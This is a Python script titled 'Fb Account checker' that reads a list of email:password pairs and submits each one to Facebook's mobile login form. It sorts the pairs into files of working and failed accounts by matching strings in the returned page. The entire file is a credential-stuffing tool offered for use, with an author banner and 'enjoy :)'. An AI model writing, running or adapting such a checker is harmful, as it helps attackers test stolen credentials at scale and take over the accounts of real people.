from robobrowser import RoboBrowser
from termcolor import colored
print(colored('''
        ======================================
        ==        Fb Account checker        ==
        ==      Coded By Ahmed Mubarak      ==
        ======================================
''' , 'blue'))
path = input("Set list name Here ===> ")
file = open(path, 'r')
check_list = open('account_error.txt', 'a')
done_list = open('accounts_done.txt', 'a')
email = ''
password = ''
print("Please Wait Maybe It take time :)")
for i in file:
    field = i.split(':')
    email = field[0]
    password = field[1]
    driver = RoboBrowser()
    driver.open("https://m.facebook.com")
    form = driver.get_form(id='login_form')
    form['email'].value = email
    form['pass'].value = password
    driver.submit_form(form, submit=form['login'])
    src = str(driver.parsed())
    if 'login_error' in src:
        check_list.write('[login error[!] check email or password! ] ' + email + ':' + password)
        print(colored('[login error[!] check email or password! ] ' + email + ':' + password, 'red'))
    elif 'checkpoint_title' in src:
        check_list.write('[Account Check Point Error !! ] '+email + ':' + password)
        print(colored('[Account Check Point Error !! ] '+email + ':' + password, 'red'))
    elif 'Log In With One Tap' in src:
        done_list.write('[Account Work successfully ! ] ' + email + ":" + password)
        print(colored('[Account Work successfully ! ] ' + email + ":" + password, 'green'))
print(colored('the list has been checked successfully enjoy :)', 'magenta'))
print(colored("Coded By Ahmed Mubarak", 'magenta'))
check_list.close()
done_list.close()
